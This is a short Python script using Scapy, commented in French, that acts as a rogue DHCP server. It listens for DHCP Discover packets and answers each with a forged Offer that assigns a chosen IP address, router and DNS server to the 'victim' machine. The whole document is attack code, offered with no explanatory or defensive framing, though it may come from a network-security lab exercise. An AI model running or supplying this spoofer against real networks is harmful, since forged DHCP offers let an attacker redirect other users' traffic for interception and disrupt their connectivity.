from scapy.all import *
from scapy.layers.dhcp import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

FAKE_DHCP_SERVER_IP = "10.1.1.100"  
FAKE_IP_OFFERED = "10.1.1.5"  
FAKE_SUBNET = "255.255.255.0"
FAKE_ROUTER = "10.1.1.1"
FAKE_DNS = "8.8.8.8"
INTERFACE = "enp0s8"  

def handle_dhcp_packet(pkt):
    """ Capture et répond aux paquets DHCP Discover """
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 1:  
        mac_victime = pkt[Ether].src
        xid = pkt[BOOTP].xid  

        print(f"[+] DHCP Discover détecté de {mac_victime}")

       
        dhcp_offer = Ether(dst=mac_victime, src=get_if_hwaddr(INTERFACE)) / \
                     IP(src=FAKE_DHCP_SERVER_IP, dst="255.255.255.255") / \
                     UDP(sport=67, dport=68) / \
                     BOOTP(op=2, yiaddr=FAKE_IP_OFFERED, siaddr=FAKE_DHCP_SERVER_IP,
                           chaddr=mac2str(mac_victime), xid=xid) / \
                     DHCP(options=[("message-type", "offer"),
                                   ("server_id", FAKE_DHCP_SERVER_IP),
                                   ("subnet_mask", FAKE_SUBNET),
                                   ("router", FAKE_ROUTER),
                                   ("name_server", FAKE_DNS),
                                   ("lease_time", 3600),
                                   "end"])

        sendp(dhcp_offer, iface=INTERFACE, verbose=False)
        print(f"[+] DHCP Offer envoyé à {mac_victime}, IP attribuée : {FAKE_IP_OFFERED}")

def dhcp_spoof():
    """ Écoute les requêtes DHCP et répond avec un DHCP Offer frauduleux """
    print("[*] Attente de DHCP Discover...")
    sniff(filter="udp and (port 67 or port 68)", iface=INTERFACE, prn=handle_dhcp_packet, store=0)

if __name__ == "__main__":
    dhcp_spoof()
